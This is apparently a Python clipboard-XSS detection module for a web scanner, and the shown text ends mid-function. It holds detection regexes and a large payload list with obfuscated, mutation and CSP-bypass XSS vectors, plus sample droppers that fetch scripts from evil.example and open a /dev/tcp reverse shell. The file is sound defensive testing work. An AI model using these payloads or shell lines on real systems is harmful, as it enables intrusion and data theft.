"""
Clipboard XSS Detection Module.

Detects XSS vulnerabilities via clipboard operations:
- navigator.clipboard.writeText() exploitation
- Paste event handler injection
- Clipboard API bypass
- Clipboard data reflection XSS
"""

import re
from typing import Dict, List, Set
from dataclasses import dataclass
from enum import Enum


class ClipboardSink(Enum):
    """Clipboard-related XSS sink types."""
    CLIPBOARD_WRITE = "clipboard_write"
    CLIPBOARD_READ = "clipboard_read"
    PASTE_EVENT = "paste_event"
    COPY_EVENT = "copy_event"
    CUT_EVENT = "cut_event"
    EXEC_COMMAND = "exec_command"


@dataclass
class ClipboardXSSVulnerability:
    """Clipboard XSS vulnerability."""
    sink: ClipboardSink
    injection_point: str
    context: str
    payload: str
    severity: str


class ClipboardXSSDetector:
    """
    Advanced clipboard XSS detector.
    Detects XSS vulnerabilities via clipboard operations.
    """

    # Clipboard API patterns
    CLIPBOARD_PATTERNS = {
        # --- Write APIs --------------------------------------------------
        ClipboardSink.CLIPBOARD_WRITE: [
            # original
            r'navigator\.clipboard\.writeText\s*\(',
            r'navigator\.clipboard\.write\s*\(',
            r'clipboard\.writeText\s*\(',
            # variants
            r'(?:window\s*\.\s*)?navigator\s*\.\s*clipboard\s*\.\s*write\b',
            r'(?:window\s*\.\s*)?navigator\s*\.\s*clipboard\s*\.\s*writeText\b',
            r'clipboard\s*\.\s*write\b',
            r'\bClipboardItem\s*\(',
            r'new\s+ClipboardItem\s*\(',
            r'\.clipboard\s*\.\s*write\s*\(\s*\[\s*new\s+ClipboardItem',
            # optional chaining
            r'navigator\s*\?\s*\.\s*clipboard\s*\?\s*\.\s*writeText',
            r'navigator\s*\?\s*\.\s*clipboard\s*\?\s*\.\s*write\b',
            # bracket access
            r'navigator\s*\[\s*[\'"]clipboard[\'"]\s*\]\s*\.\s*writeText',
            r'navigator\s*\[\s*[\'"]clipboard[\'"]\s*\]\s*\[\s*[\'"]writeText[\'"]\s*\]',
            r'navigator\s*\.\s*clipboard\s*\[\s*[\'"]writeText[\'"]\s*\]',
            r'navigator\s*\.\s*clipboard\s*\[\s*[\'"]write[\'"]\s*\]',
            # string-concat obfuscation
            r'[\'"]wri[\'"]\s*\+\s*[\'"]teText[\'"]',
            r'[\'"]write[\'"]\s*\+\s*[\'"]Text[\'"]',
            r'[\'"]wri[\'"]\s*\+\s*[\'"]te[\'"]',
            # destructuring / aliasing
            r'\b(?:const|let|var)\s*\{\s*writeText\s*(?:,\s*write\s*)?\}\s*=\s*(?:window\s*\.\s*)?navigator\s*\.\s*clipboard',
            r'\b(?:const|let|var)\s+\w+\s*=\s*(?:window\s*\.\s*)?navigator\s*\.\s*clipboard\b',
            # legacy / IE
            r'\bwindow\s*\.\s*clipboardData\s*\.\s*setData\s*\(',
            r'\bdocument\s*\.\s*execCommand\s*\(\s*[\'"]copy[\'"]',
            r'\bdocument\s*\.\s*execCommand\s*\(\s*[\'"]cut[\'"]',
        ],

        # --- Read APIs ---------------------------------------------------
        ClipboardSink.CLIPBOARD_READ: [
            # original
            r'navigator\.clipboard\.readText\s*\(',
            r'navigator\.clipboard\.read\s*\(',
            r'clipboard\.readText\s*\(',
            # variants
            r'(?:window\s*\.\s*)?navigator\s*\.\s*clipboard\s*\.\s*read\b',
            r'clipboard\s*\.\s*read\b',
            r'navigator\s*\?\s*\.\s*clipboard\s*\?\s*\.\s*readText',
            r'navigator\s*\?\s*\.\s*clipboard\s*\?\s*\.\s*read\b',
            # bracket access
            r'navigator\s*\[\s*[\'"]clipboard[\'"]\s*\]\s*\[\s*[\'"]readText[\'"]\s*\]',
            r'navigator\s*\.\s*clipboard\s*\[\s*[\'"]readText[\'"]\s*\]',
            r'navigator\s*\.\s*clipboard\s*\[\s*[\'"]read[\'"]\s*\]',
            r'[\'"]rea[\'"]\s*\+\s*[\'"]dText[\'"]',
            r'[\'"]read[\'"]\s*\+\s*[\'"]Text[\'"]',
            # destructuring
            r'\b(?:const|let|var)\s*\{\s*readText\s*(?:,\s*read\s*)?\}\s*=\s*(?:window\s*\.\s*)?navigator\s*\.\s*clipboard',
            # clipboardData.getData
            r'\.\s*clipboardData\s*\.\s*getData\s*\(',
            r'\.\s*clipboardData\s*\[\s*[\'"]getData[\'"]\s*\]\s*\(',
            r'\.\s*clipboardData\s*\.\s*getData\s*\(\s*[\'"]text/html[\'"]',
            r'\.\s*clipboardData\s*\.\s*getData\s*\(\s*[\'"]text/plain[\'"]',
            r'\.\s*clipboardData\s*\.\s*getData\s*\(\s*[\'"]text/uri-list[\'"]',
            # legacy / IE
            r'\bwindow\s*\.\s*clipboardData\s*\.\s*getData\s*\(',
            r'\bdocument\s*\.\s*execCommand\s*\(\s*[\'"]paste[\'"]',
            # permissions
            r'navigator\s*\.\s*permissions\s*\.\s*query\s*\(\s*\{[^}]{0,120}[\'"]clipboard-read[\'"]',
        ],

        # --- Paste / copy / cut events ----------------------------------
        ClipboardSink.PASTE_EVENT: [
            # original
            r'addEventListener\s*\(\s*["\']paste',
            r'onpaste\s*=',
            r'\.onpaste\s*=',
            # variants
            r'addEventListener\s*\(\s*[\'"]paste[\'"]',
            r'\.\s*onpaste\s*=',
            r'[\'"]paste[\'"]\s*,\s*(?:function|\()',
            r'\bonpaste\s*=\s*[\'"]',
            r'React\s*\.\s*createElement[^)]{0,300}onPaste',
            r'\bonPaste\s*=\s*\{',
            r'@paste\b|v-on:paste\b',
            r'\(paste\)\s*=',
            r'addEventListener\s*\(\s*[\'"]paste[\'"]\s*,\s*(?:async\s*)?(?:function|\()',
            # obfuscated
            r'[\'"]pa[\'"]\s*\+\s*[\'"]ste[\'"]',
            r'[\'"]pas[\'"]\s*\+\s*[\'"]te[\'"]',
        ],
        ClipboardSink.COPY_EVENT: [
            # original
            r'addEventListener\s*\(\s*["\']copy',
            r'oncopy\s*=',
            r'\.oncopy\s*=',
            # variants
            r'addEventListener\s*\(\s*[\'"]copy[\'"]',
            r'\.\s*oncopy\s*=',
            r'React\s*\.\s*createElement[^)]{0,300}onCopy',
            r'\bonCopy\s*=\s*\{',
            r'@copy\b|v-on:copy\b',
            r'addEventListener\s*\(\s*[\'"]beforecopy[\'"]',
            r'\bonbeforecopy\s*=',
            # obfuscated
            r'[\'"]co[\'"]\s*\+\s*[\'"]py[\'"]',
        ],
        ClipboardSink.CUT_EVENT: [
            # original
            r'addEventListener\s*\(\s*["\']cut',
            r'oncut\s*=',
            r'\.oncut\s*=',
            # variants
            r'addEventListener\s*\(\s*[\'"]cut[\'"]',
            r'\.\s*oncut\s*=',
            r'React\s*\.\s*createElement[^)]{0,300}onCut',
            r'\bonCut\s*=\s*\{',
            r'@cut\b|v-on:cut\b',
            r'addEventListener\s*\(\s*[\'"]beforecut[\'"]',
            r'\bonbeforecut\s*=',
            # obfuscated
            r'[\'"]c[\'"]\s*\+\s*[\'"]ut[\'"]',
        ],

        # --- execCommand-driven clipboard ops ---------------------------
        ClipboardSink.EXEC_COMMAND: [
            # original
            r'document\.execCommand\s*\(\s*["\']paste',
            r'document\.execCommand\s*\(\s*["\']copy',
            r'document\.execCommand\s*\(\s*["\']cut',
            # variants
            r'document\s*\.\s*execCommand\s*\(\s*[\'"]insertHTML[\'"]',
            r'document\s*\.\s*execCommand\s*\(\s*[\'"]insertText[\'"]',
            r'document\s*\.\s*execCommand\s*\(\s*[\'"]insertimage[\'"]',
            r'document\s*\[\s*[\'"]execCommand[\'"]\s*\]',
            r'[\'"]exec[\'"]\s*\+\s*[\'"]Command[\'"]',
            r'(?:document|window)\s*\.\s*execCommand\s*\(\s*(?:[\'"])(?:paste|copy|cut|insertHTML|insertText|insertimage)',
        ],
    }

    # Dangerous clipboard integration patterns
    DANGEROUS_PATTERNS = [
        # --- Direct HTML Injection Sinks --------------------------------
        r'innerHTML\s*=\s*clipboardData',
        r'outerHTML\s*=\s*clipboardData',
        r'insertAdjacentHTML\s*\([^,]*,\s*clipboardData',
        r'document\.write\s*\(\s*clipboardData',
        r'document\.writeln\s*\(\s*clipboardData',
        r'\.html\s*\(\s*clipboardData',                       # jQuery .html()
        r'dangerouslySetInnerHTML\s*=\s*\{\s*__html:\s*clipboardData',  # React
        r'dangerouslySetInnerHTML\s*:\s*\{\s*__html\s*:\s*[^}]*clipboard',
        r'v-html\s*=\s*[\'"]clipboardData',                   # Vue.js
        r'\[innerHTML\]\s*=\s*[\'"]clipboardData',            # Angular
        r'\{@html\s+clipboardData',                           # Svelte
        r'unsafeHTML\s*\(\s*clipboardData',                   # lit-html

        # --- Compound-assign / bracket variants ------------------------
        r'innerHTML\s*\+=\s*clipboardData',
        r'\.\s*\[\s*[\'"]innerHTML[\'"]\s*\]\s*=\s*clipboardData',
        r'\.\s*\[\s*[\'"]outerHTML[\'"]\s*\]\s*=\s*clipboardData',
        r'document\s*\[\s*[\'"]write(?:ln)?[\'"]\s*\]\s*\(\s*clipboardData',
        r'\.\s*\[\s*[\'"]insertAdjacentHTML[\'"]\s*\]\s*\([^,]*,\s*clipboardData',

        # --- Code Execution Sinks --------------------------------------
        r'eval\s*\(\s*clipboardData',
        r'new\s+Function\s*\(\s*clipboardData',
        r'setTimeout\s*\(\s*clipboardData',
        r'setInterval\s*\(\s*clipboardData',
        r'(?:window|self|top|globalThis)\s*\[\s*[\'"]eval[\'"]\s*\]\s*\(\s*clipboardData',
        r'\(\s*0\s*,\s*eval\s*\)\s*\(\s*clipboardData',
        r'\[\s*[\'"]constructor[\'"]\s*\]\s*\[\s*[\'"]constructor[\'"]\s*\]\s*\(\s*clipboardData',
        r'\.\s*constructor\s*\(\s*clipboardData',
        r'Function\s*\(\s*clipboardData\s*\)\s*\(\s*\)',
        r'setTimeout\s*\(\s*[\'"][^\'"]*[\'"]\s*\+\s*clipboardData',
        r'\$\s*\.\s*globalEval\s*\(\s*clipboardData',
        r'\bimport\s*\(\s*clipboardData',
        r'\bimportScripts\s*\(\s*clipboardData',
        r'new\s+Worker\s*\(\s*clipboardData',
        r'Worker\s*\(\s*(?:URL\s*\.\s*createObjectURL|clipboardData)',

        # --- Clipboard Event Data Access & Misuse ----------------------
        r'event\.clipboardData\.getData',
        r'\.clipboardData\.getData\s*\(\s*[\'"]text/html[\'"]',
        r'\.clipboardData\.getData\s*\(\s*[\'"]text/plain[\'"]',
        r'\.clipboardData\.getData\s*\(\s*[\'"]text/uri-list[\'"]',
        r'\.clipboardData\s*\[\s*[\'"]getData[\'"]\s*\]',
        r'[\'"]get[\'"]\s*\+\s*[\'"]Data[\'"]',
        r'navigator\.clipboard\.readText',
        r'navigator\.clipboard\.read',
        r'navigator\s*\[\s*[\'"]clipboard[\'"]\s*\]\s*\[\s*[\'"]readText[\'"]\s*\]',
        r'clipboardData\.setData',        # clipboard hijacking: overwriting content
        r'window\.clipboardData\.setData',  # legacy IE
        r'addEventListener\s*\(\s*[\'"]paste[\'"]',  # paste listener that may lack sanitization
        r'addEventListener\s*\(\s*[\'"]copy[\'"]',   # copy listener that may rewrite clipboard
        r'addEventListener\s*\(\s*[\'"]cut[\'"]',
        r'onpaste\s*=\s*(?:function|\(|async)',
        r'oncopy\s*=\s*(?:function|\(|async)',
        r'oncut\s*=\s*(?:function|\(|async)',

        # --- Read → Sink chains (common in real exploits) -------------
        r'(?:navigator\s*\.\s*clipboard\s*\.\s*readText|clipboard\s*\.\s*readText)\s*\(\s*\)\s*\.\s*then\s*\(\s*(?:async\s*)?(?:function\s*)?\(?\s*\w+\s*\)?\s*=>',
        r'await\s+(?:navigator\s*\.\s*clipboard\s*\.\s*readText|clipboard\s*\.\s*readText)\s*\(\s*\)',
        r'await\s+navigator\s*\.\s*clipboard\s*\.\s*read\s*\(\s*\)',
        r'\.\s*getType\s*\(\s*[\'"]text/html[\'"]\s*\)\s*\.\s*then',
        r'new\s+FileReader\s*\([^)]*\)[^;\n]{0,200}clipboard',
        r'URL\s*\.\s*createObjectURL\s*\(\s*(?:new\s+)?Blob\s*\(\s*\[[^\]]*clipboard',

        # --- URL / Attribute assignment from clipboard -----------------
        r'location\.(href|assign|replace)\s*=\s*clipboardData',
        r'location\s*\.\s*href\s*=\s*clipboardData',
        r'(?<![\w$.])location\s*=\s*clipboardData',
        r'(?:top|parent|self|window|document)\s*\.\s*location\s*(?:\.\s*href\s*)?=\s*clipboardData',
        r'window\.open\s*\(\s*clipboardData',
        r'\.\s*(?:href|src|action|formaction|data|poster)\s*=\s*clipboardData',
        r'setAttribute\s*\(\s*[\'"](?:href|src|srcdoc|action|formaction|style|on\w+)[\'"]\s*,\s*clipboardData',
        r'setAttributeNS\s*\([^,]*,\s*[\'"](?:href|src|on\w+)[\'"]\s*,\s*clipboardData',
        r'\.\s*attr\s*\(\s*[\'"](?:href|src|on\w+)[\'"]\s*,\s*clipboardData',
        r'document\.domain\s*=\s*clipboardData',

        # --- Document / fragment / parser sinks -----------------------
        r'DOMParser\s*\([^)]*\)[^;\n]{0,120}clipboard',
        r'parseFromString\s*\(\s*clipboardData',
        r'createContextualFragment\s*\(\s*clipboardData',
        r'createHTMLDocument\s*\(\s*clipboardData',
        r'\.\s*setHTMLUnsafe\s*\(\s*clipboardData',
        r'\.\s*setHTML\s*\(\s*clipboardData',
        r'Range\s*\([^)]*\)[^;\n]{0,120}createContextualFragment\s*\(\s*clipboardData',

        # --- jQuery & other libs --------------------------------------
        r'\$\s*\(\s*clipboardData\s*\)',
        r'\.\s*(?:append|prepend|before|after|replaceWith|html|text)\s*\(\s*clipboardData',
        r'\$\s*\.\s*parseHTML\s*\(\s*clipboardData',
        r'\$\s*\.\s*getScript\s*\(\s*clipboardData',

        # --- Script / iframe tag creation -----------------------------
        r'createElement\s*\(\s*[\'"]script[\'"]\s*\)[^;\n]{0,200}clipboardData',
        r'(?:script|s)\s*\.\s*(?:src|text|textContent|innerHTML)\s*=\s*clipboardData',
        r'(?:iframe|frame)\s*\.\s*srcdoc\s*=\s*clipboardData',

        # --- Framework-Specific Sinks ---------------------------------
        r'v-html\s*=\s*[\'"]clipboardData',                       # Vue
        r'\[innerHTML\]\s*=\s*[\'"]clipboardData',                # Angular
        r'\{@html\s+clipboardData',                               # Svelte
        r'ng-bind-html\s*=\s*[\'"]clipboardData',                 # AngularJS
        r'bypassSecurityTrust(?:Html|Script|Url)\s*\(\s*clipboardData',  # Angular

        # --- Obfuscated clipboard identifiers ------------------------
        r'[\'"]clip[\'"]\s*\+\s*[\'"]boardData[\'"]',
        r'[\'"]clipboard[\'"]\s*\]\s*\.\s*getData',
        r'window\s*\[\s*[\'"]clip[\'"]\s*\+\s*[\'"]boardData[\'"]\s*\]',
        r'\.\s*\[\s*[\'"]clipboardData[\'"]\s*\]\s*\.\s*getData',
        r'(?:window|document)\s*\[\s*[\'"]clip[\'"]\s*\+\s*[\'"]boardData[\'"]\s*\]',

        # --- Clipboard hijackers / clippers (real-world malware) -----
        # Crypto-address replacement: attacker watches clipboard & swaps wallet addresses.
        r'\bbitcoin\s*:|\bethereum\s*:|\bmonero\s*:|\blitecoin\s*:',
        r'\bbc1[a-z0-9]{25,62}\b',                              # bech32 BTC
        r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b',                 # legacy BTC
        r'\b0x[a-fA-F0-9]{40}\b',                               # ETH / BSC / Polygon
        r'\bT[1-9A-HJ-NP-Za-km-z]{33}\b',                       # TRON
        r'\bltc1[a-z0-9]{25,62}\b',                             # Litecoin bech32
        r'\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b',                # Monero
        r'\br[1-9A-HJ-NP-Za-km-z]{24,34}\b',                    # XRP
        # Clipboard → shell execution (Windows / *nix droppers)
        r'powershell(?:\.exe)?\s+-[A-Za-z]*[Ee]\w*',            # -EncodedCommand
        r'powershell(?:\.exe)?\s+-[A-Za-z]*[Cc]\w*',            # -Command
        r'iwr\s+https?://\S+\s*\|\s*iex',
        r'Invoke-WebRequest[^;|]*\|\s*Invoke-Expression',
        r'curl\s+[^\s|]+\s*\|\s*(?:sh|bash)',
        r'wget\s+[^\s|]+\s*-O\s*-\s*\|\s*(?:sh|bash)',
        r'bash\s+-i\s*>&\s*/dev/tcp/',
        r'/dev/tcp/\d{1,3}(?:\.\d{1,3}){3}/\d{1,5}',
        r'mshta\s+(?:javascript|vbscript|https?):',
        r'certutil(?:\.exe)?\s+-urlcache',
        r'bitsadmin\s+/transfer',

        # --- Clipboard → exfiltration ---------------------------------
        r'fetch\s*\([^)]{0,300}clipboard',
        r'fetch\s*\([^)]{0,300}(?:readText|clipboardData)',
        r'XMLHttpRequest[^;\n]{0,300}clipboard',
        r'\.send\s*\(\s*clipboardData',
        r'\.send\s*\(\s*[^)]{0,200}clipboard',
        r'new\s+Image\s*\(\s*\)\s*\.\s*src\s*=[^;\n]{0,200}clipboard',
        r'document\.cookie[^;\n]{0,200}clipboard',
    ]

    # XSS payloads for clipboard testing
    CLIPBOARD_XSS_PAYLOADS = [
        # --- 1. Basic & Event Handler Vectors --------------------------
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<video><source onerror=alert(1)></video>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",  # Legacy but sometimes works
        # added real-world basics
        "<img/src=x/onerror=alert(1)>",         # slash separator
        "<img src=x onerror=alert(1)//",
        "<svg/onload=alert(1)>",
        "<svg/onload=alert(1)//",
        "<svg><g/onload=alert(1)//",
        "<details/open/ontoggle=alert(1)>",
        "<input/onmouseover=alert(1) autofocus>",
        "<body/onload=alert(1)>",
        "<video/src=x/onerror=alert(1)>",
        "<x onclick=alert(1)>click</x>",
        "<isindex action=javascript:alert(1) type=image>",   # legacy
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<form action=javascript:alert(1)><input type=submit>",
        "<button formaction=javascript:alert(1)>go</button>",
        "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
        "<base href=javascript:alert(1)//>",
        "<link rel=import href=javascript:alert(1)>",        # legacy HTML imports
        "<iframe src=javascript:alert(1)>",
        "<iframe srcdoc=\"<script>parent.alert(1)</script>\">",
        "<a href=javascript:alert(1)>click</a>",
        "<math><mi xlink:href=javascript:alert(1)>click</mi></math>",

        # --- 2. Obfuscated & Encoded Payloads -------------------------
        # JavaScript obfuscation using String.fromCharCode
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))</script>",
        # Base64 encoding with atob
        "<script>eval(atob('YWxlcnQoMSk='))</script>",        # atob('alert(1)')
        "<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>",
        "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
        # JSFuck-style (using only []()!+)
        # JSFuck(alert(1)) — truncated; JSFuck can encode arbitrary JS
        "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+...)",
        # Unicode / hex escapes inside script
        "<script>\\u0061lert(1)</script>",
        "<script>\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029</script>",
        "<script>\\x61lert(1)</script>",
        "<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>",
        # String-concat evasions
        "<script>eval('al'+'ert(1)')</script>",
        "<script>top['al'+'ert'](1)</script>",
        "<script>window['ev'+'al']('alert(1)')</script>",
        "<script>[].constructor.constructor('alert(1)')()</script>",
        "<script>(0,eval)('alert(1)')</script>",
        "<script>Function('alert(1)')()</script>",
        "<script>setTimeout('alert(1)',0)</script>",
        "<script>void(0),eval('alert(1)')</script>",
        # HTML entity encoding in attribute
        "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "<img src=x onerror=alert&lpar;1&rpar;>",
        # Mixed case, tabs, newlines, nulls
        "<ScRiPt>alert(1)</sCrIpT>",
        "<img src=x onerror\n=alert(1)>",
        "<img src=x onerror\t=alert(1)>",
        "<img/src=x\tonerror=alert(1)>",
        "<scr\0ipt>alert(1)</scr\0ipt>",          # null-byte (legacy parsers)
        # javascript: with encoded whitespace / control chars
        "java%0ascript:alert(1)",                 # newline
        "java%09script:alert(1)",                 # tab
        "java%0dscript:alert(1)",                 # CR
        "\\x0Bjavascript:alert(1)",               # vertical tab prefix
        "\\xE2\\x80\\x89javascript:alert(1)",     # thin space prefix
        "jav&#x09;ascript:alert(1)",
        "&#106;avascript:alert(1)",
        "javascript&colon;alert(1)",
        "JaVaScRiPt:alert(1)",
        "javascript:alert(1)//",
        "javascript://%0Aalert(1)",               # comment-based bypass

        # --- 3. Mutation XSS (mXSS) Payloads --------------------------
        # Safe when sanitized, but "mutate" into executable code on re-parse.
        # Classic DOMPurify bypass (math/mtext context)
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">",
        # Noscript-based mutation
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        # Deep nesting / node flattening
        "<div><div><div><div><div><div><div><div><img src=x onerror=alert(1)></div></div></div></div></div></div></div></div>",
        # Payload that survives multiple parsing cycles
        "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
        "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title=\"</style><img src onerror=alert(1)>\">",
        "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",

        # --- 4. SVG-Specific Payloads ---------------------------------
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set attributeName=onmouseover to=alert(1)>",
        "<svg><a><text x=20 y=20>Click me</text></a></svg>",  # requires interaction
        "<svg><a xlink:href=javascript:alert(1)><text>click</text></a></svg>",
        "<svg><script href=\"data:text/javascript,alert(1)\"/>",
        "<svg><script xlink:href=data:,%3Cscript%3Ealert(1)%3C/script%3E>",
        "<svg><foreignObject><iframe srcdoc=\"<script>alert(1)</script>\"/></foreignObject>",
        "<iframe src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>\">",
        "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\"/>",

        # --- 5. Polyglot Payloads -------------------------------------
        # "Jackmasa" polyglot — works in HTML / attribute / JS-string contexts
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        # More concise polyglots
        "\"><img src=x onerror=alert(1)>\".<script>alert(1)</script>",
        "'><svg/onload=alert(1)>",
        "\"><svg onload=alert(1)>",
        "</title><script>alert(1)</script>",
        "\"/><script>alert(1)</script>",
        "'-alert(1)-'",
        "`;alert(1);//",
        "${alert(1)}",
        "{{constructor.constructor('alert(1)')()}}",           # Angular template
        "{{$on.constructor('alert(1)')()}}",
        "{{_c.constructor('alert(1)')()}}",                    # AngularJS 1.6

        # --- 6. CSP Bypass & Script Gadget Payloads -------------------
        "<script src=\"https://whitelisted-domain.com/jsonp?callback=alert(1)\"></script>",
        "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert(1)\"></script>",
        "<div ng-app ng-csp><div ng-click=$event.view.alert(1)>Click</div></div>",
        "<script src=\"https://whitelisted-cdn.com/vulnerable-library.js\"></script>",
        "<base href=\"https://evil.example/\">",
        "<link rel=preload href=\"https://evil.example/x.js\" as=script>",
        "<link rel=stylesheet href=\"https://evil.example/exfil.css\">",
        "<script src=\"//evil.example/x.js\"></script>",
        "<script src=\"data:text/javascript,alert(1)\"></script>",

        # --- 7. Data URI & URL-Based Payloads -------------------------
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:text/html;charset=utf-8,<script>alert(1)</script>",
        "data:image/svg+xml,<svg onload=alert(1)>",
        "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",
        "data:application/javascript,alert(1)",
        "javascript:alert(1)",
        "javascript://%0Aalert(1)",               # comment-based bypass
        "vbscript:msgbox(1)",                     # legacy IE vector

        # --- 8. Clipboard → HTML/JS execution payloads (real-world) ---
        # Payload that inspects clipboard-origin text and executes it
        "<script>navigator.clipboard.readText().then(t=>eval(t))</script>",
        "<script>document.addEventListener('paste',e=>eval(e.clipboardData.getData('text/plain')))</script>",
        "<script>document.onpaste=e=>new Function(e.clipboardData.getData('text'))()</script>",
        "<div contenteditable onpaste=\"this.innerHTML=event.clipboardData.getData('text/html')\">paste here</div>",
        "<div contenteditable oncopy=\"event.clipboardData.setData('text/plain','pwned')\">copy me</div>",
        # Direct JS payloads that end up in an eval/clipboard sink
        "alert(1)",
        "alert(document.domain)",
        "top['al'+'ert'](1)",
        "window['ev'+'al']('alert(1)')",
        "[].constructor.constructor('alert(1)')()",
        "(0,eval)('alert(1)')",
        "Function('alert(1)')()",
        "setTimeout('alert(1)',0)",
        "String.fromCharCode(97,108,101,114,116,40,49,41)",
        "atob('YWxlcnQoMSk=')",
        "\\u0061lert(1)",
        "\\x61lert(1)",
        "eval('al'+'ert(1)')",
        "eval(atob('YWxlcnQoMSk='))",

        # --- 9. Clipboard hijack / clipper payloads (defensive test) --
        # Crypto-address replacement strings — used to detect clippers
        "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
        "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
        "TNPeeaaFB7K9cmo4uQpcU32zGK8G1NYqeL",
        "ltc1qh3w5n3c7z5x7zvqk09t6fxr0n0l6y6u0l0l0l0",
        # Shell droppers often placed on the clipboard (not executed by us)
        "powershell -NoP -NonI -W Hidden -Enc aQBlAHgA",
        "iwr http://evil.example/x.ps1 | iex",
        "curl -s http://evil.example/x.sh | sh",
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        "mshta javascript:alert(1)",
    ]

    def __init__(self):
        self._detected_sinks: Set[ClipboardSink] = set()
        self._vulnerabilities: List[ClipboardXSSVulnerability] = []

    def detect_clipboard_sinks(self, js_content: str, html_content: str = "") -> Set[ClipboardSink]:
        """
        Detect clipboard-related XSS sinks.

        Args:
            js_content: JavaScript source code
            html_content: HTML source code

        Returns:
            Set of detected clipboard sinks
        """
        combined = js_content + "\n" + html_content
        detected = set()

        for sink, patterns in self.CLIPBOARD_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    detected.add(sink)
                    break

        self._detected_sinks = detected
        return detected

    def check_dangerous_integration(self, js_content: str, marker: str = "xoxss") -> List[ClipboardXSSVulnerability]:
        """
        Check for dangerous clipboard integration patterns.

        Args:
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        lines = js_content.split('\n')

        for line_num, line in enumerate(lines, 1):
            for pattern in self.DANGEROUS_PATTERNS:
                if re.search(pattern, line, re.IGNORECASE):
                    for payload in self.CLIPBOARD_XSS_PAYLOADS:
                        marked = payload.replace("alert(1)", f"alert('{marker}')")
                        vulnerabilities.append(ClipboardXSSVulnerability(
                            sink=ClipboardSink.CLIPBOARD_READ,
                            injection_point=f"line_{line_num}",
                            context="Dangerous clipboard integration with DOM sink",
                            payload=marked,
                            severity="high"
                        ))

        return vulnerabilities

    def check_paste_event_xss(self, js_content: str, marker: str = "xoxss") -> List[ClipboardXSSVulnerability]:
        """
        Check for XSS in paste event handlers.

        Args:
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        lines = js_content.split('\n')

        for line_num, line in enumerate(lines, 1):
            # Check for paste event handlers
            if re.search(r'onpaste|addEventListener.*paste', line, re.IGNORECASE):
                # Check if paste data is written to DOM
                if re.search(r'innerHTML|outerHTML|document\.write|eval|new\s+Function', line, re.IGNORECASE):
                    for payload in self.CLIPBOARD_XSS_PAYLOADS:
                        marked = payload.replace("alert(1)", f"alert('{marker}')")
                        vulnerabilities.append(ClipboardXSSVulnerability(
                            sink=ClipboardSink.PASTE_EVENT,
                            injection_point=f"line_{line_num}",
                            context="Paste event handler with DOM sink",
                            payload=marked,
                            severity="high"
                        ))

        return vulnerabilities

    def check_clipboard_reflection(self, js_content: str, marker: str = "xoxss") -> List[ClipboardXSSVulnerability]:
        """
        Check for clipboard data reflection XSS.

        Args:
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        lines = js_content.split('\n')

        for line_num, line in enumerate(lines, 1):
            # Check for clipboard read followed by DOM write
            if re.search(r'clipboardData|clipboard\.read|navigator\.clipboard\.read', line, re.IGNORECASE):
                # Check if data is reflected to DOM
                if re.search(r'innerHTML|outerHTML|document\.write|eval|new\s+Function', line, re.IGNORECASE):
                    for payload in self.CLIPBOARD_XSS_PAYLOADS:
                        marked = payload.replace("alert(1)", f"alert('{marker}')")
                        vulnerabilities.append(ClipboardXSSVulnerability(
